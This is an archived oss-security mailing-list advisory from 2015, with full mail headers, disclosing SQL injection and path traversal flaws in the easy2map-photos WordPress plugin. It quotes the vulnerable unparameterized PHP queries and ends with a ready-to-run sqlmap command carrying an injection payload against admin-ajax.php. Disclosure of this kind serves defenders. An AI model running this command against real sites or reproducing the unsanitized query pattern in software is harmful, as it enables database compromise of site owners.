X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3120" "Wednesday" "8" "July" "2015" "07:18:22" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<A7208BBF-9042-4260-9241-3329840245F5@me.com>" "83" "[oss-security] SQL Injection in easy2map-photos wordpress plugin v1.09" nil nil nil "7" "2015070811:18:22" "[oss-security] SQL Injection in easy2map-photos wordpress plugin v1.09" (number mark "U       larry0@me.co Jul  8   83/3120  " thread-indent "\"[oss-security] SQL Injection in easy2map-photos wordpress plugin v1.09\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 31910 invoked by uid 550); 8 Jul 2015 11:18:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 31869 invoked from network); 8 Jul 2015 11:18:39 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-08_05:2015-07-08,2015-07-08,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507080186
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <A7208BBF-9042-4260-9241-3329840245F5@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Date: Wed, 08 Jul 2015 07:18:22 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] SQL Injection in easy2map-photos wordpress plugin v1.09
To: Open Source Security <oss-security@lists.openwall.com>

Title: SQL Injection in easy2map-photos wordpress plugin v1.09
Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-08
Download Site: https://wordpress.org/plugins/easy2map-photos
Vendor: Steven Ellis
Vendor Notified: 2015-06-08, fixed in v1.1.0
Vendor Contact: https://profiles.wordpress.org/stevenellis/
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D130
Description: Easy2Map Photos is a simple-yet-powerful tool for generating g=
reat-looking geo-tagged photo galleries.
Vulnerability:
The following lines in includes/Functions.php are vulnerable to SQL injecti=
on attack because they aren=E2=80=99t parameterized or sanitizing user inpu=
t.

48         $wpdb->query(sprintf("UPDATE $mapsTable
49         SET PolyLines =3D '%s'
50         WHERE ID =3D '%s';", $PolyLines, $mapID));
218             $wpdb->query(sprintf("
219                 UPDATE $mapsTable
220                 SET TemplateID =3D '%s',
221                     MapName =3D '%s',
222                     Settings =3D '%s',
223                     CSSValues =3D '%s',
224                     CSSValuesPhoto =3D '%s',
225                     CSSValuesMap =3D '%s',
226                     MapHTML =3D '%s',
227                     IsActive =3D 1
228                 WHERE ID =3D %s;",
229                     $_REQUEST['mapTemplateName'],
230                     $_REQUEST['mapName'],
231                     urldecode($_REQUEST['mapSettingsXML']),
232                     urldecode($_REQUEST["parentCSSXML"]),
233                     urldecode($_REQUEST["photoCSSXML"]),
234                     urldecode($_REQUEST["mapCSSXML"]),
235                     urldecode($_REQUEST["mapHTML"]), $mapID));


238             //this is a map insert
239             if (!$wpdb->query(sprintf("
240             INSERT INTO $mapsTable(
241                 TemplateID,
242                 MapName,
243                 DefaultPinImage,
244                 Settings,
245                 LastInvoked,
246                 PolyLines,
247                 CSSValues,
248                 CSSValuesPhoto,
249                 CSSValuesMap,
250                 MapHTML,
251                 IsActive
252             ) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '=
%s', '%s'    , 0);",
253                     $_REQUEST['mapTemplateName'],
254                     $_REQUEST['mapName=E2=80=99]


331         $wpdb->query(sprintf("
332             UPDATE $mapsTable
333             SET MapName =3D '%s'
334             IsActive =3D 1
335             WHERE ID =3D %s;",
336                 $_REQUEST['mapName'],
337                 $mapID));

Also

In MapPinImageUpload.php and MapPinIconSave.php this code would allow someo=
ne to create files outside of the intended upload directory by adding ../..=
/../../ path traversal characters:

   if (!file_exists($imagesDirectory)) {
       mkdir($imagesDirectory);
   }

CVEID: 2015-4615 2015-4617
OSVDB:
Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://wp.site:80/wp-admin/admin-ajax.php' --data=
=3D"mapID=3D11&mapName=3D'+or+1%3D%3D1%3B&action=3De2m_img_save_map_name" -=
-cookie=3DCOOKIE HERE --level=3D5 --risk=3D3

